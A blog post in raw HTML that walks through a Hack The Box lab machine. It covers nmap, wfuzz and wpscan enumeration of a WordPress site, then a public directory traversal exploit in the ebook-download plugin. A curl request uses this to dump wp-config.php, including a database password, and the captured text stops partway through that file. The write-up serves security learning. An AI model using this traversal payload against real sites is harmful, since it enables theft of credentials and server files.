<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="generator" content="Jekyll v4.2.2" /><meta property="og:title" content="Backdoor Write-up" /><meta property="og:locale" content="en" /><meta name="description" content="Enumeration" /><meta property="og:description" content="Enumeration" /><link rel="canonical" href="https://g2jz.github.io/posts/backdoor/" /><meta property="og:url" content="https://g2jz.github.io/posts/backdoor/" /><meta property="og:site_name" content="root@g2jz:~#" /><meta property="og:image" content="https://g2jz.github.io/cover.png" /><meta property="og:image:height" content="300" /><meta property="og:image:width" content="700" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2022-10-12T09:00:00+02:00" /><meta name="twitter:card" content="summary_large_image" /><meta property="twitter:image" content="https://g2jz.github.io/cover.png" /><meta property="twitter:title" content="Backdoor Write-up" /><meta name="twitter:site" content="@g2jzz" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2022-10-12T09:00:00+02:00","datePublished":"2022-10-12T09:00:00+02:00","description":"Enumeration","headline":"Backdoor Write-up","image":{"width":700,"height":300,"url":"https://g2jz.github.io/cover.png","@type":"imageObject"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://g2jz.github.io/posts/backdoor/"},"url":"https://g2jz.github.io/posts/backdoor/"}</script><title>Backdoor Write-up | root@g2jz:~#</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="root@g2jz:~#"><meta name="application-name" content="root@g2jz:~#"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" crossorigin><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get MODE_ATTR() { return "data-mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } static get ID() { return "mode-toggle"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } let self = this; /* always follow the system prefers */ this.sysDarkPrefers.addEventListener("change", () => { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.notify(); }); } /* constructor() */ get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode === ModeToggle.DARK_MODE; } get isLightMode() { return this.mode === ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer)) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } setDark() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_ATTR, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_ATTR); sessionStorage.removeItem(ModeToggle.MODE_KEY); } /* Notify another plugins that the theme mode has changed */ notify() { window.postMessage({ direction: ModeToggle.ID, message: this.modeStatus }, "*"); } } /* ModeToggle */ const toggle = new ModeToggle(); function flipMode() { if (toggle.hasMode) { if (toggle.isSysDarkPrefer) { if (toggle.isLightMode) { toggle.clearMode(); } else { toggle.setLight(); } } else { if (toggle.isDarkMode) { toggle.clearMode(); } else { toggle.setDark(); } } } else { if (toggle.isSysDarkPrefer) { toggle.setLight(); } else { toggle.setDark(); } } toggle.notify(); } /* flipMode() */ </script><body data-spy="scroll" data-target="#toc" data-topbar-visible="true"><div id="sidebar" class="d-flex flex-column align-items-end"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" class="mx-auto"> <img src="/assets/img/commons/avatar.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">root@g2jz:~#</a></div><div class="site-subtitle font-italic">g2jz's Personal Blog</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tag ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center align-items-center"> <button class="mode-toggle btn" aria-label="Switch Mode"> <i class="fas fa-adjust"></i> </button> <span class="icon-border"></span> <a href="https://github.com/g2jz" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github"></i> </a> <a href="https://www.linkedin.com/in/gaizka-martin/" aria-label="linkedin" target="_blank" rel="noopener"> <i class="fab fa-linkedin"></i> </a> <a href="https://twitter.com/g2jzz" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['gmartinmendiola','gmail.com'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a></div></div><div id="topbar-wrapper"><div id="topbar" class="container d-flex align-items-center justify-content-between h-100 pl-3 pr-3 pl-md-4 pr-md-4"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Backdoor Write-up</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper" class="d-flex justify-content-center"><div id="main" class="container pl-xl-4 pr-xl-4"><div class="row"><div id="core-wrapper" class="col-12 col-lg-11 col-xl-9 pr-xl-4"><div class="post pl-1 pr-1 pl-md-2 pr-md-2"><h1 data-toc-skip>Backdoor Write-up</h1><div class="post-meta text-muted"> <span> Posted <em class="" data-ts="1665558000" data-df="ll" data-toggle="tooltip" data-placement="bottom"> Oct 12, 2022 </em> </span><div class="mt-3 mb-3"> <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 300'%3E%3C/svg%3E" data-src="/assets/img/posts/backdoor/cover.png" class="preview-img bg" alt="Preview Image" width="700" height="300" data-proofer-ignore></div><div class="d-flex justify-content-between"> <span> By <em> <a href="https://twitter.com/g2jzz">Gaizka Martín Mendiola</a> </em> </span><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="3574 words"> <em>19 min</em> read</span></div></div></div><div class="post-content"><h2 id="enumeration"><span class="mr-2">Enumeration</span><a href="#enumeration" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><h3 id="os-detection"><span class="mr-2">OS Detection</span><a href="#os-detection" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>In order to identify the machine that we are dealing with, we will perform an OS detection. This can be done very simply, as the <code class="language-plaintext highlighter-rouge">TTL (Time To Live)</code> of a <code class="language-plaintext highlighter-rouge">ping</code> response can give us clues. <code class="language-plaintext highlighter-rouge">TTL</code> will be close to 64 on Unix machines, close to 128 on Windows machines, and close to 255 on Solaris machines.</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/backdoor/ping.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Ping target machine</em></p><p>We can see that the machine that we are targeting has a TTL of 63, so we guess that we are dealing with a Unix machine.</p><h3 id="nmap"><span class="mr-2">Nmap</span><a href="#nmap" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>First, we will start enumerating the open ports on the victim machine with <a href="https://github.com/nmap/nmap">nmap</a>. We will specify that we want to scan all the port range, that we only want to display the open ports and that we will use the TCP Syn Port Scan scanning method. Additionally, we will specify explicitly that we don’t want to perform host discovery and DNS resolution. This will speed up the process. Lastly, we will export all the evidence to a file called <code class="language-plaintext highlighter-rouge">allPorts.txt</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p-</span> <span class="nt">-sS</span> <span class="nt">--min-rate</span> 5000 <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oG</span> allPorts.txt 10.10.11.125
</pre></table></code></div></div><div file="enum/access/allPorts.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/access/allPorts.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre># Nmap 7.92 scan initiated Mon Oct 10 09:15:55 2022 as: nmap -p- -sS --min-rate 5000 -n -Pn -oG allPorts.txt 10.10.11.125
Host: 10.10.11.125 ()	Status: Up
Host: 10.10.11.125 ()	Ports: 22/open/tcp//ssh///, 80/open/tcp//http///, 1337/open/tcp//waste///	Ignored State: closed (65532)
# Nmap done at Mon Oct 10 09:16:08 2022 -- 1 IP address (1 host up) scanned in 13.01 seconds
</pre></table></code></div></div><p>Once we know the open ports, we will scan them in a more exhaustive way to find the services and versions that are running. We will export evidence to the <code class="language-plaintext highlighter-rouge">targeted.txt</code> file:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">-p22</span>,80,1337 <span class="nt">-sCV</span> <span class="nt">-n</span> <span class="nt">-Pn</span> <span class="nt">-oN</span> targeted.txt 10.10.11.125
</pre></table></code></div></div><div file="enum/access/targeted.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/access/targeted.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre># Nmap 7.92 scan initiated Mon Oct 10 09:16:47 2022 as: nmap -p22,80,1337 -sCV -n -Pn -oN targeted.txt 10.10.11.125
Nmap scan report for 10.10.11.125
Host is up (0.035s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 b4:de:43:38:46:57:db:4c:21:3b:69:f3:db:3c:62:88 (RSA)
|   256 aa:c9:fc:21:0f:3e:f4:ec:6b:35:70:26:22:53:ef:66 (ECDSA)
|_  256 d2:8b:e4:ec:07:61:aa:ca:f8:ec:1c:f8:8c:c1:f6:e1 (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Backdoor &amp;#8211; Real-Life
|_http-generator: WordPress 5.8.1
1337/tcp open  waste?
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 10 09:17:09 2022 -- 1 IP address (1 host up) scanned in 21.95 seconds
</pre></table></code></div></div><p>The target machine has the 22 (SSH), 80 (HTTP) and 1337 (Unknown) ports open.</p><p>As the SSH service is running a pretty new version of <code class="language-plaintext highlighter-rouge">OpenSSH</code> and we can’t identify the service running on port 1337, we will start enumerating the web server on port 80.</p><p>We will do a simple scan of the web server using an integrated <code class="language-plaintext highlighter-rouge">Nmap</code> script named <code class="language-plaintext highlighter-rouge">http-enum</code> that is part of the <code class="language-plaintext highlighter-rouge">NSE Engine</code>. This script will try the most common files and directories on the web servers, and if they exist, it will report them. We will save the evidence to a file called <code class="language-plaintext highlighter-rouge">webScan.txt</code>:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>nmap <span class="nt">--script</span> http-enum <span class="nt">-p80</span> <span class="nt">-oN</span> webScan.txt 10.10.11.125
</pre></table></code></div></div><div file="enum/access/webScan.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/access/webScan.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
</pre><td class="rouge-code"><pre># Nmap 7.92 scan initiated Mon Oct 10 09:26:04 2022 as: nmap --script http-enum -p80 -oN webScan.txt 10.10.11.125
Nmap scan report for 10.10.11.125
Host is up (0.035s latency).

PORT   STATE SERVICE
80/tcp open  http
| http-enum: 
|   /wp-login.php: Possible admin folder
|   /readme.html: Wordpress version: 2 
|   /: WordPress version: 5.8.1
|   /wp-includes/images/rss.png: Wordpress version 2.2 found.
|   /wp-includes/js/jquery/suggest.js: Wordpress version 2.5 found.
|   /wp-includes/images/blank.gif: Wordpress version 2.6 found.
|   /wp-includes/js/comment-reply.js: Wordpress version 2.7 found.
|   /wp-login.php: Wordpress login page.
|   /wp-admin/upgrade.php: Wordpress login page.
|_  /readme.html: Interesting, a readme.

# Nmap done at Mon Oct 10 09:26:13 2022 -- 1 IP address (1 host up) scanned in 8.44 seconds
</pre></table></code></div></div><p>We can see that there are some interesting directories on the web server, and judging by the structure, we can say that we are dealing with a <a href="https://es.wordpress.org/">Wordpress</a> web server.</p><h3 id="fuzzing"><span class="mr-2">Fuzzing</span><a href="#fuzzing" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><p>If we know the structure that the <code class="language-plaintext highlighter-rouge">Wordpress</code> <code class="language-plaintext highlighter-rouge">CMS (Content Management System)</code> usually has, we know that it contains a folder named <code class="language-plaintext highlighter-rouge">wp-content</code>. This folder is usually used to host the content of the web server, including user-uploaded data. We use <a href="https://github.com/xmendez/wfuzz">wfuzz</a> to fuzz its directories:</p><div file="enum/access/wp-content.fuzz" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/access/wp-content.fuzz"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre>Target: http://10.10.11.125/wp-content/FUZZ
Total requests: 220560
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00001:  C=200      0 L	       0 W	      0 Ch	  "# directory-list-2.3-medium.txt"
00006:  C=200      0 L	       0 W	      0 Ch	  "# Attribution-Share Alike 3.0 License. To view a copy of this"
00003:  C=200      0 L	       0 W	      0 Ch	  "# Copyright 2007 James Fisher"
00005:  C=200      0 L	       0 W	      0 Ch	  "# This work is licensed under the Creative Commons"
00002:  C=200      0 L	       0 W	      0 Ch	  "#"
00004:  C=200      0 L	       0 W	      0 Ch	  "#"
00007:  C=200      0 L	       0 W	      0 Ch	  "# license, visit http://creativecommons.org/licenses/by-sa/3.0/"
00009:  C=200      0 L	       0 W	      0 Ch	  "# Suite 300, San Francisco, California, 94105, USA."
00013:  C=200      0 L	       0 W	      0 Ch	  "#"
00011:  C=200      0 L	       0 W	      0 Ch	  "# Priority ordered case-sensitive list, where entries were found"
00012:  C=200      0 L	       0 W	      0 Ch	  "# on at least 2 different hosts"
00008:  C=200      0 L	       0 W	      0 Ch	  "# or send a letter to Creative Commons, 171 Second Street,"
00010:  C=200      0 L	       0 W	      0 Ch	  "#"
00014:  C=200      0 L	       0 W	      0 Ch	  "http://10.10.11.125/wp-content/"
00127:  C=301      9 L	      28 W	    324 Ch	  "themes"
00164:  C=301      9 L	      28 W	    325 Ch	  "uploads"
00519:  C=301      9 L	      28 W	    325 Ch	  "plugins"
01031:  C=301      9 L	      28 W	    325 Ch	  "upgrade"
45240:  C=200      0 L	       0 W	      0 Ch	  "http://10.10.11.125/wp-content/"

Total time: 0
Processed Requests: 220560
Filtered Requests: 220541
Requests/sec.: 0
</pre></table></code></div></div><p>We can see some interesting folders as <code class="language-plaintext highlighter-rouge">uploads</code> and <code class="language-plaintext highlighter-rouge">plugins</code>. The first one is usually where user-uploaded data is hosted, and the second one corresponds to the <code class="language-plaintext highlighter-rouge">Wordpress</code> plugins that are being used. This last one is critical to examine as plugins often contain vulnerabilities and are not updated as often as the <code class="language-plaintext highlighter-rouge">CMS</code>.</p><div file="enum/access/wp-content-plugins.fuzz" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="enum/access/wp-content-plugins.fuzz"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
</pre><td class="rouge-code"><pre>Target: http://10.10.11.125/FUZZ
Total requests: 13368
==================================================================
ID    Response   Lines      Word         Chars          Request    
==================================================================
00468:  C=403      9 L	      28 W	    277 Ch	  "wp-content/plugins/akismet/"
04592:  C=500      0 L	       0 W	      0 Ch	  "wp-content/plugins/hello.php"
04593:  C=500      0 L	       0 W	      0 Ch	  "wp-content/plugins/hello.php/"

Total time: 0
Processed Requests: 13368
Filtered Requests: 13365
Requests/sec.: 0
</pre></table></code></div></div><p>We will find the <code class="language-plaintext highlighter-rouge">akismet</code> and the <code class="language-plaintext highlighter-rouge">hello.php</code> plugins. This plugins don’t seem to have any vulnerability, so we will proceed to examine the <code class="language-plaintext highlighter-rouge">CMS</code> further.</p><h3 id="wordpress"><span class="mr-2">Wordpress</span><a href="#wordpress" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h3><h4 id="wpscan"><span class="mr-2">Wpscan</span><a href="#wpscan" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>We don’t have a defined access point, so we will enumerate further the web server. We are dealing with a <code class="language-plaintext highlighter-rouge">Wordpress</code> web server, so we can use the <a href="https://github.com/wpscanteam/wpscan">wpscan</a> tool to enumerate it.</p><p>We will start by performing aggressive plugin detection. This will allow us to discover if there are more plugins than the ones that we have found doing fuzzing:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>wpscan <span class="nt">-e</span> ap <span class="nt">--plugins-detection</span> aggressive <span class="nt">--url</span> http://10.10.11.125
</pre></table></code></div></div><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/backdoor/wpscan.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>WpScan plugins</em></p><p>We can see how there is a plugin called <code class="language-plaintext highlighter-rouge">ebook-download</code> that we haven’t discovered in the fuzzing phase. Additionally, <code class="language-plaintext highlighter-rouge">wpscan</code> reveals to us that the version that is being used is <code class="language-plaintext highlighter-rouge">1.1</code>.</p><h4 id="directory-traversal"><span class="mr-2">Directory Traversal</span><a href="#directory-traversal" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h4><p>We will search for exploits in the <code class="language-plaintext highlighter-rouge">ebook-download</code> plugin with <a href="https://github.com/offensive-security/exploitdb">searchsploit</a>:</p><p><img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 700 400'%3E%3C/svg%3E" data-src="/assets/img/posts/backdoor/searchsploit.png" alt="Desktop View" width="700" height="400" data-proofer-ignore> <em>Searchsploit</em></p><p>There is a <code class="language-plaintext highlighter-rouge">Directory Traversal</code> vulnerability in the <code class="language-plaintext highlighter-rouge">1.1</code> version of <code class="language-plaintext highlighter-rouge">ebook-download</code>, the version that we have just discovered the web server is using. We will inspect this exploit further:</p><div file="exploits/access/eBookWordpressExploit.txt" class="language-text highlighter-rouge"><div class="code-header"> <span data-label-text="exploits/access/eBookWordpressExploit.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre># Exploit Title: Wordpress eBook Download 1.1 | Directory Traversal
# Exploit Author: Wçadeek
# Website Author: https://github.com/Wad-Deek
# Software Link: https://downloads.wordpress.org/plugin/ebook-download.zip
# Version: 1.1
# Tested on: Xampp on Windows7

[Version Disclosure]
======================================
http://localhost/wordpress/wp-content/plugins/ebook-download/readme.txt
======================================

[PoC]
======================================
/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl=../../../wp-config.php
======================================
</pre></table></code></div></div><p>We can see that this exploit is a <code class="language-plaintext highlighter-rouge">.txt</code> file explaining how the <code class="language-plaintext highlighter-rouge">Directory Traversal</code> vulnerability can be used. Basically, there is a file called <code class="language-plaintext highlighter-rouge">filedownload.php</code> in the <code class="language-plaintext highlighter-rouge">ebook-download</code> plugin, that has an <code class="language-plaintext highlighter-rouge">ebookdownloadurl</code> parameter that can be pointed to internal resources using <code class="language-plaintext highlighter-rouge">Directory Traversal</code>.</p><p>First, we can try to download the <code class="language-plaintext highlighter-rouge">wp-config.php</code> file of the web server, as it usually contains credentials in plain text or at least useful information. If we notice, we have to go back three directories to be at the root of the web server. This is where the <code class="language-plaintext highlighter-rouge">wp-config.php</code> file is located. We will curl the mentioned endpoint in order to try to download the file:</p><div class="language-bash highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre>curl http://10.10.11.125/wp-content/plugins/ebook-download/filedownload.php?ebookdownloadurl<span class="o">=</span>../../../wp-config.php
</pre></table></code></div></div><div file="content/access/wp-config.txt" class="language-php highlighter-rouge"><div class="code-header"> <span data-label-text="content/access/wp-config.txt"><i class="far fa-file-code"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
</pre><td class="rouge-code"><pre>../../../wp-config.php../../../wp-config.php../../../wp-config.php<span class="cp">&lt;?php</span>
<span class="cd">/**
 * The base configuration for WordPress
 *
 * The wp-config.php creation script uses this file during the installation.
 * You don't have to use the web site, you can copy this file to "wp-config.php"
 * and fill in the values.
 *
 * This file contains the following configurations:
 *
 * * MySQL settings
 * * Secret keys
 * * Database table prefix
 * * ABSPATH
 *
 * @link https://wordpress.org/support/article/editing-wp-config-php/
 *
 * @package WordPress
 */</span>

<span class="c1">// ** MySQL settings - You can get this info from your web host ** //</span>
<span class="cd">/** The name of the database for WordPress */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_NAME'</span><span class="p">,</span> <span class="s1">'wordpress'</span> <span class="p">);</span>

<span class="cd">/** MySQL database username */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_USER'</span><span class="p">,</span> <span class="s1">'wordpressuser'</span> <span class="p">);</span>

<span class="cd">/** MySQL database password */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_PASSWORD'</span><span class="p">,</span> <span class="s1">'MQYBJSaD#DxG6qbm'</span> <span class="p">);</span>

<span class="cd">/** MySQL hostname */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_HOST'</span><span class="p">,</span> <span class="s1">'localhost'</span> <span class="p">);</span>

<span class="cd">/** Database charset to use in creating database tables. */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_CHARSET'</span><span class="p">,</span> <span class="s1">'utf8'</span> <span class="p">);</span>

<span class="cd">/** The database collate type. Don't change this if in doubt. */</span>
<span class="nb">define</span><span class="p">(</span> <span class="s1">'DB_COLLATE'</span><span class="p">,</span> <span class="s1">''</span> <span class="p">);</span>

<span class="cd">/**#@+
 * Authentication unique keys and salts.
 *
 * Change these to different unique phrases! You can generate these using
 * the {@link https://api.wordpress.org/secret-key/1.1/salt/ WordPress.org secret-key service}.
 *
 * You can change these at any point in time to invalidate all existing cookies.
 * This will force all users to have to log in again.
 *
 * @since 2.6.0
 */</span>

<span class="cm">/* That's all, stop editing! Happy blogging. */</span>
<span class="cd">/** Absolute path to the WordPress directory. */</span>
<span class="k">if</span> <span class="p">(</span> <span class="o">!</span><span class="nb">defined</span><span class="p">(</span><span class="s1">'ABSPATH'</span><span class="p">)</span> <span class="p">)</span>
<span class="nb">define</span><span class="p">(</span><span class="s1">'ABSPATH'</span><span class="p">,</span> <span class="nb">dirname</span><span class="p">(</span><span class="k">__FILE__</span><span class="p">)</span> <span class="mf">.</span> <span class="s1">'/'</span><span class="p">);</span>
<span class="cm">/* THIS IS CUSTOM CODE CREATED AT ZEROFRACTAL TO MAKE SITE ACCESS DYNAMIC */</span>
<span class="nv">$currenthost</span> <span class="o">=</span> <span class="s2">"http://"</span><span class="mf">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'HTTP_HOST'</span><span class="p">];</span>
<span class="nv">$currentpath</span> <span class="o">=</span> <span class="nb">preg_replace</span><span class="p">(</span><span class="s1">'@/+$@'</span><span class="p">,</span><span class="s1">''</span><span class="p">,</span><span class="nb">dirname</span><span class="p">(</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s1">'SCRIPT_NAME'</span><span class="p">]));</span>
